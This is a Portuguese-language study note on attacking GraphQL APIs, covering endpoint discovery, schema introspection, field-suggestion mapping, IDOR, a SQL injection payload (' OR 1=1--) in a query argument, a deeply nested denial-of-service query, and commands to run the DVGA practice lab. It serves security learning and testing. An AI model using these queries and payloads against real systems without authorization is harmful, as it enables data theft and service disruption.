# Vulnerabilidades em GraphQL

## Por que GraphQL tem seu próprio conjunto de vulnerabilidades?

A natureza do GraphQL - endpoint único, queries flexíveis, introspection ativa por padrão - cria uma superfície de ataque diferente do REST.

---

## Reconhecimento

### 1. Localizando o endpoint

```
/graphql
/graphiql
/graph
/v1/graphql
/api/graphql
/v1/graph
```

### 2. Introspection - descobrindo o schema completo

```graphql
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

Se retornar o schema completo, você sabe exatamente quais queries, mutations e campos existem - incluindo os que não estão documentados.

**Ferramenta:** **GraphQL Voyager** gera um mapa visual interativo a partir da resposta de introspection.

### 3. Quando introspection está bloqueada - Field Suggestions

Mesmo sem introspection, o GraphQL sugere campos quando você digita algo errado:

```graphql
{
  usr {      # typo intencional
    nome
  }
}
```

Resposta: `"Did you mean 'user'?"`

A ferramenta **Clairvoyance** automatiza esse processo para mapear todo o schema indiretamente.

---

## GraphiQL exposto

Se o servidor tiver o GraphiQL (a IDE web do GraphQL) acessível publicamente, você tem uma interface completa para explorar a API sem precisar de nenhuma outra ferramenta.

---

## Information Disclosure

Queries de GraphQL podem retornar mais dados do que o front-end exibe. Inspecione a resposta completa - campos sensíveis podem estar lá mas não renderizados na interface.

```graphql
{
  usuario(id: 1) {
    nome
    email
    senha_hash    # campo "oculto" mas presente na resposta
    token_reset
  }
}
```

---

## IDOR em GraphQL

Assim como no REST, trocar o ID do recurso pode revelar dados de outros usuários:

```graphql
{
  usuario(id: 2) {    # trocou de 1 para 2
    nome
    email
    documentos_privados {
      conteudo
    }
  }
}
```

---

## SQL Injection via argumentos

Se o backend não sanitizar os argumentos da query:

```graphql
{
  pastes(title: "' OR 1=1--") {
    titulo
    conteudo
  }
}
```

SQL gerado internamente:
```sql
SELECT * FROM pastes WHERE title = '' OR 1=1--'
```

---

## DoS por queries aninhadas (Batch/Depth Attack)

O GraphQL permite queries aninhadas em múltiplos níveis. Sem limitação de profundidade, uma query pode gerar uma carga enorme no servidor:

```graphql
{
  usuarios {
    posts {
      comentarios {
        autor {
          posts {
            comentarios {
              ...  # recursão profunda
            }
          }
        }
      }
    }
  }
}
```

---

## Ferramentas para testar GraphQL

| Ferramenta | Uso |
|-----------|-----|
| **Burp Suite + InQL Extension** | Interceptar e explorar requisições GraphQL |
| **GraphQL Voyager** | Visualizar o schema graficamente |
| **GraphQL Network Inspector** | Extensão do Chrome para inspecionar tráfego GraphQL |
| **Clairvoyance** | Mapear schema quando introspection está bloqueada |
| **DVGA** | Damn Vulnerable GraphQL Application — lab para praticar |

---

## Lab recomendado

**DVGA (Damn Vulnerable GraphQL Application)**

```bash
# Rodar via Docker
docker pull dolevf/dvga
docker run -t -p 5013:5013 -e WEB_HOST=0.0.0.0 dolevf/dvga
```

Acesse: `http://localhost:5013`

Contém vulnerabilidades como: introspection aberta, IDOR, SQL injection, DoS por queries aninhadas e Information Disclosure.
